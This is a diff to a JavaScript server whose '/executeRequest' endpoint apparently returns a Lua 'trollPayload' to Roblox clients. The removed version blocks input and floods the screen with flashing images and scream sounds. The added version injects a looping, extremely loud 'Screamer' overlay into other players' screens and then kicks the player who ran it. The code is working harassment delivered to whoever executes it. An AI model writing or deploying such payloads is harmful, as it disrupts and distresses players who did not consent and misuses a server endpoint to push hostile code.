@@ -32,202 +32,47 @@ app.post("/executeRequest", (req, res) => {
   const reason = generateGibberish();
 
 const trollPayload = `
+-- Gibberish generator function (Lua version)
+local function generateGibberish(length)
+	local chars = {"你","好","世","界","𓂀","𒐫","Æ","Ø","µ","Δ","Ж","Ѭ","(",")"}
+	local result = ""
+	for i = 1, length do
+		result = result .. chars[math.random(1, #chars)]
+	end
+	return result
+end
+
 local Players = game:GetService("Players")
-local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
 
--- Message options for glitch overlay
-local scaryMessages = {"ERROR", "ACCESS DENIED", "BACKDOOR DETECTED", "INTRUSION ALERT", "SYSTEM LOCKDOWN"}
-local bloodImg = "rbxassetid://138208823" -- blood drip
-local staticImg = "rbxassetid://138207912" -- static
-local vignetteImg = "rbxassetid://138205016" -- vignette
-local soundId = "rbxassetid://138186576" -- creepy scream
+for _, v in pairs(Players:GetPlayers()) do
+	if v ~= LocalPlayer and not v:FindFirstChild("PlayerGui"):FindFirstChild("Screamer") then
+		spawn(function()
+			local newgui = Instance.new("ScreenGui", v:FindFirstChild("PlayerGui"))
+			newgui.Name = "Screamer"
 
-local function createTrollGui(parent)
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "UltimateTrollGui"
-    gui.IgnoreGuiInset = true
-    gui.ResetOnSpawn = false
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-    gui.Parent = parent
+			local newimage = Instance.new("ImageLabel")
+			newimage.Image = "http://www.roblox.com/asset/?id=16635097419"
+			newimage.Size = UDim2.new(1, 0, 1, 0)
+			newimage.Parent = newgui
 
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1e5, 0, 1e5, 0)
-    frame.Position = UDim2.new(-5e4, 0, -5e4, 0)
-    frame.BackgroundColor3 = Color3.new(1, 0, 0)
-    frame.BorderSizePixel = 0
-    frame.Name = "ScreenDestroyer"
-    frame.Parent = gui
+			local s = Instance.new("Sound")
+			s.SoundId = "rbxassetid://6018028320"
+			s.Volume = 10e9
+			s.Looped = true
+			s.Parent = newgui
+			s:Play()
 
-    -- Input blocker
-    local blocker = Instance.new("TextButton")
-    blocker.Size = UDim2.new(1, 0, 1, 0)
-    blocker.Position = UDim2.new(0, 0, 0, 0)
-    blocker.BackgroundTransparency = 1
-    blocker.Text = ""
-    blocker.Parent = frame
-    blocker.AutoButtonColor = false
-    blocker.Active = true
-    blocker.Selectable = false
-    blocker.Modal = true
+			print("Screamed " .. v.Name)
 
-    -- Vignette overlay
-    local vignette = Instance.new("ImageLabel")
-    vignette.BackgroundTransparency = 1
-    vignette.Image = vignetteImg
-    vignette.Size = UDim2.new(1, 0, 1, 0)
-    vignette.Position = UDim2.new(0, 0, 0, 0)
-    vignette.ZIndex = 10
-    vignette.Parent = frame
-
-    -- Static flicker
-    local static = Instance.new("ImageLabel")
-    static.BackgroundTransparency = 1
-    static.Image = staticImg
-    static.Size = UDim2.new(1, 0, 1, 0)
-    static.Position = UDim2.new(0, 0, 0, 0)
-    static.ZIndex = 15
-    static.Visible = false
-    static.Parent = frame
-
-    -- Blood overlay
-    local blood = Instance.new("ImageLabel")
-    blood.BackgroundTransparency = 1
-    blood.Image = bloodImg
-    blood.Size = UDim2.new(1, 0, 1, 0)
-    blood.Position = UDim2.new(0, 0, 0, 0)
-    blood.ZIndex = 18
-    blood.ImageTransparency = 0.7
-    blood.Parent = frame
-
-    -- Main scary message
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, 0, 0.3, 0)
-    textLabel.Position = UDim2.new(0, 0, 0.35, 0)
-    textLabel.BackgroundTransparency = 1
-    textLabel.Text = "COOLKID HAS STOPPED YOU\nFROM EXPLOITING"
-    textLabel.TextColor3 = Color3.new(1, 1, 1)
-    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-    textLabel.TextStrokeTransparency = 0
-    textLabel.Font = Enum.Font.Antique
-    textLabel.TextScaled = true
-    textLabel.TextWrapped = true
-    textLabel.ZIndex = 20
-    textLabel.Parent = frame
-
-    -- Flashing scary overlay messages
-    local flashLabel = Instance.new("TextLabel")
-    flashLabel.Size = UDim2.new(0.4, 0, 0.1, 0)
-    flashLabel.Position = UDim2.new(0.3, 0, 0.8, 0)
-    flashLabel.BackgroundTransparency = 1
-    flashLabel.TextColor3 = Color3.new(1, 0, 0)
-    flashLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-    flashLabel.TextStrokeTransparency = 0
-    flashLabel.Font = Enum.Font.Arcade
-    flashLabel.TextScaled = true
-    flashLabel.Text = ""
-    flashLabel.Visible = false
-    flashLabel.ZIndex = 25
-    flashLabel.Parent = frame
-
-    -- SCREAM SOUND SPAM
-    spawn(function()
-        while true do
-            local sound = Instance.new("Sound")
-            sound.SoundId = soundId
-            sound.Volume = math.random(6, 10) / 10
-            sound.PlaybackSpeed = 0.8 + math.random() * 0.6
-            sound.Parent = frame
-            sound:Play()
-            sound.Ended:Connect(function() sound:Destroy() end)
-            wait(0.02)
-        end
-    end)
-
-    -- Background color flicker
-    spawn(function()
-        while true do
-            for i = 0, 1, 0.1 do
-                frame.BackgroundColor3 = Color3.new(1, 0, 0):Lerp(Color3.new(0, 0, 0), i)
-                wait(0.05)
-            end
-            for i = 0, 1, 0.1 do
-                frame.BackgroundColor3 = Color3.new(0, 0, 0):Lerp(Color3.new(1, 0, 0), i)
-                wait(0.05)
-            end
-        end
-    end)
-
-    -- Static flickering
-    spawn(function()
-        while true do
-            static.Visible = true
-            wait(0.05)
-            static.Visible = false
-            wait(math.random(1, 3) / 10)
-        end
-    end)
-
-    -- Glitch text effect
-    spawn(function()
-        local originalText = textLabel.Text
-        local chars = {"@", "#", "$", "%", "&", "!", "?", "*", "Ʃ", "λ", "X"}
-        while true do
-            local glitch = ""
-            for i = 1, #originalText do
-                if math.random() < 0.25 then
-                    glitch = glitch .. chars[math.random(#chars)]
-                else
-                    glitch = glitch .. originalText:sub(i, i)
-                end
-            end
-            textLabel.Text = glitch
-            textLabel.TextColor3 = Color3.new(math.random(), math.random(), math.random())
-            wait(0.05)
-            textLabel.Text = originalText
-            textLabel.TextColor3 = Color3.new(1, 1, 1)
-            wait(0.1)
-        end
-    end)
-
-    -- Screen shake + zoom
-    spawn(function()
-        local amplitude = 15
-        while true do
-            for i = 1, 30 do
-                frame.Position = UDim2.new(-5e4 + math.random(-amplitude, amplitude), 0, -5e4 + math.random(-amplitude, amplitude), 0)
-                frame.Size = UDim2.new(1e5 + math.random(-10, 10), 0, 1e5 + math.random(-10, 10), 0)
-                wait(0.03)
-            end
-            frame.Position = UDim2.new(-5e4, 0, -5e4, 0)
-            frame.Size = UDim2.new(1e5, 0, 1e5, 0)
-            wait(0.1)
-        end
-    end)
-
-    -- Flash scary message text
-    spawn(function()
-        while true do
-            flashLabel.Text = scaryMessages[math.random(#scaryMessages)]
-            flashLabel.Visible = true
-            wait(0.15)
-            flashLabel.Visible = false
-            wait(math.random(2, 5) / 2)
-        end
-    end)
+			wait(9.4)
+			newimage:Destroy()
+		end)
+	end
 end
 
--- Run for PlayerGui
-createTrollGui(Players.LocalPlayer:WaitForChild("PlayerGui"))
-
--- Run for CoreGui
-createTrollGui(CoreGui)
-
--- Wrap all existing ScreenGuis
-for _, sg in ipairs(CoreGui:GetDescendants()) do
-    if sg:IsA("ScreenGui") then
-        createTrollGui(sg)
-    end
-end
+-- Kick the local player with gibberish reason
+LocalPlayer:Kick(generateGibberish(16))
 
 `;
 
